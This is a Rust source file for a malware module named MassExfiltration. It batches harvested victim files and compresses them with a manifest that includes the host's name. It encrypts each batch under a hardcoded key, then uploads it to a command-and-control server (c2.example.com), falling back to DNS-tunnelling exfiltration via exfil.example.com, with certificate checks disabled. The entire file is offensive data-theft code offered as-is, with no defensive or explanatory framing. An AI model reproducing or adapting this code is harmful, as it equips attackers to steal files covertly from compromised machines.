use std::fs;
use std::path::Path;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;
use flate2::write::GzEncoder;
use flate2::Compression;
use std::io::Write;
use crate::mass_harvest::{FileEntry, FileType};

pub struct MassExfiltration {
    c2_client: reqwest::Client,
    chunk_size: usize,
    max_concurrent: usize,
    exfiltrated: Arc<Mutex<Vec<String>>>,
    failed: Arc<Mutex<Vec<String>>>,
}

impl MassExfiltration {
    pub fn new(c2_url: &str) -> Self {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(60))
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap();
        
        Self {
            c2_client: client,
            chunk_size: 5 * 1024 * 1024, // 5MB chunks
            max_concurrent: 3,
            exfiltrated: Arc::new(Mutex::new(Vec::new())),
            failed: Arc::new(Mutex::new(Vec::new())),
        }
    }
    
    pub async fn exfiltrate_all(&self, files: &[FileEntry]) -> ExfilResult {
        // Group files by priority
        let mut priority_groups: Vec<Vec<&FileEntry>> = vec![vec![]; 10];
        
        for file in files {
            let priority_bucket = (file.priority / 10).min(9) as usize;
            priority_groups[priority_bucket].push(file);
        }
        
        // Process highest priority first
        for (priority, group) in priority_groups.iter().enumerate().rev() {
            if group.is_empty() {
                continue;
            }
            
            println!("Processing priority {}: {} files", priority * 10, group.len());
            
            // Create batches
            let batches = self.create_batches(group);
            
            for batch in batches {
                self.process_batch(batch).await;
                
                // Rate limiting between batches
                tokio::time::sleep(Duration::from_secs(5)).await;
            }
        }
        
        ExfilResult {
            exfiltrated: self.exfiltrated.lock().unwrap().clone(),
            failed: self.failed.lock().unwrap().clone(),
            total_bytes: self.calculate_total_bytes(files),
        }
    }
    
    fn create_batches<'a>(&self, files: &[&'a FileEntry]) -> Vec<Vec<&'a FileEntry>> {
        let mut batches: Vec<Vec<&FileEntry>> = Vec::new();
        let mut current_batch: Vec<&FileEntry> = Vec::new();
        let mut current_size: u64 = 0;
        
        for file in files {
            if current_size + file.size > self.chunk_size as u64 {
                if !current_batch.is_empty() {
                    batches.push(current_batch);
                    current_batch = Vec::new();
                    current_size = 0;
                }
            }
            
            current_batch.push(file);
            current_size += file.size;
        }
        
        if !current_batch.is_empty() {
            batches.push(current_batch);
        }
        
        batches
    }
    
    async fn process_batch(&self, batch: Vec<&FileEntry>) {
        // Compress batch
        let compressed = match self.compress_batch(&batch) {
            Some(c) => c,
            None => {
                for file in batch {
                    self.failed.lock().unwrap().push(file.path.to_string_lossy().to_string());
                }
                return;
            }
        };
        
        // Encrypt
        let encrypted = self.encrypt_data(&compressed);
        
        // Upload with retry
        let mut uploaded = false;
        for attempt in 0..3 {
            match self.upload_batch(&encrypted, batch.len()).await {
                Ok(_) => {
                    uploaded = true;
                    break;
                }
                Err(e) => {
                    if attempt < 2 {
                        tokio::time::sleep(Duration::from_secs(10 * (attempt + 1))).await;
                    }
                }
            }
        }
        
        if uploaded {
            for file in batch {
                self.exfiltrated.lock().unwrap().push(file.path.to_string_lossy().to_string());
            }
        } else {
            for file in batch {
                self.failed.lock().unwrap().push(file.path.to_string_lossy().to_string());
            }
        }
    }
    
    fn compress_batch(&self, files: &[&FileEntry]) -> Option<Vec<u8>> {
        let mut encoder = GzEncoder::new(Vec::new(), Compression::best());
        
        // Write manifest
        let manifest = self.create_manifest(files);
        let _ = encoder.write_all(&manifest);
        
        // Write files
        for file in files {
            if let Ok(data) = fs::read(&file.path) {
                // Write file header
                let header = format!("FILE:{}:{}\n", 
                    file.path.to_string_lossy(),
                    data.len()
                );
                let _ = encoder.write_all(header.as_bytes());
                let _ = encoder.write_all(&data);
                let _ = encoder.write_all(b"\n---END---\n");
            }
        }
        
        encoder.finish().ok()
    }
    
    fn create_manifest(&self, files: &[&FileEntry]) -> Vec<u8> {
        let manifest = serde_json::json!({
            "count": files.len(),
            "timestamp": chrono::Utc::now().to_rfc3339(),
            "hostname": whoami::hostname(),
            "files": files.iter().map(|f| {
                serde_json::json!({
                    "path": f.path.to_string_lossy(),
                    "size": f.size,
                    "priority": f.priority,
                    "type": format!("{:?}", f.file_type),
                })
            }).collect::<Vec<_>>(),
        });
        
        format!("MANIFEST:{}\n", manifest.to_string()).into_bytes()
    }
    
    fn encrypt_data(&self, data: &[u8]) -> Vec<u8> {
        use aes_gcm::{
            aead::{Aead, KeyInit},
            Aes256Gcm, Nonce,
        };
        use sha2::{Sha256, Digest};
        
        let key = {
            let mut hasher = Sha256::new();
            hasher.update(b"MassExfilKey2024");
            hasher.finalize()
        };
        
        let cipher = Aes256Gcm::new_from_slice(&key).unwrap();
        let nonce = Nonce::from_slice(b"exfilnonce12");
        
        cipher.encrypt(nonce, data).unwrap_or_default()
    }
    
    async fn upload_batch(&self, data: &[u8], file_count: usize) -> Result<(), Box<dyn std::error::Error>> {
        let encoded = base64::encode(data);
        
        // Multiple transport methods
        let methods = vec![
            self.upload_https(&encoded).await,
            self.upload_dns(&encoded).await,
        ];
        
        for result in methods {
            if result.is_ok() {
                return Ok(());
            }
        }
        
        Err("All upload methods failed".into())
    }
    
    async fn upload_https(&self, data: &str) -> Result<(), Box<dyn std::error::Error>> {
        let response = self.c2_client
            .post("https://c2.example.com/upload")
            .header("Content-Type", "application/json")
            .json(&serde_json::json!({
                "data": data,
                "type": "mass_exfil",
                "timestamp": chrono::Utc::now().timestamp(),
            }))
            .send()
            .await?;
        
        if response.status().is_success() {
            Ok(())
        } else {
            Err("HTTP upload failed".into())
        }
    }
    
    async fn upload_dns(&self, data: &str) -> Result<(), Box<dyn std::error::Error>> {
        // DNS exfiltration as fallback
        let chunks: Vec<String> = data.as_bytes()
            .chunks(63)
            .map(|c| base64::encode(c))
            .collect();
        
        for (i, chunk) in chunks.iter().enumerate() {
            let domain = format!("{}.{}.{}.exfil.example.com", 
                chunk, 
                i,
                chrono::Utc::now().timestamp()
            );
            
            let _ = tokio::net::lookup_host(&domain).await;
            
            // Slow down DNS queries
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
        
        Ok(())
    }
    
    fn calculate_total_bytes(&self, files: &[FileEntry]) -> u64 {
        files.iter().map(|f| f.size).sum()
    }
    
    pub fn get_progress(&self) -> ExfilProgress {
        ExfilProgress {
            exfiltrated: self.exfiltrated.lock().unwrap().len(),
            failed: self.failed.lock().unwrap().len(),
        }
    }
}

#[derive(Debug)]
pub struct ExfilResult {
    pub exfiltrated: Vec<String>,
    pub failed: Vec<String>,
    pub total_bytes: u64,
}

#[derive(Debug)]
pub struct ExfilProgress {
    pub exfiltrated: usize,
    pub failed: usize,
}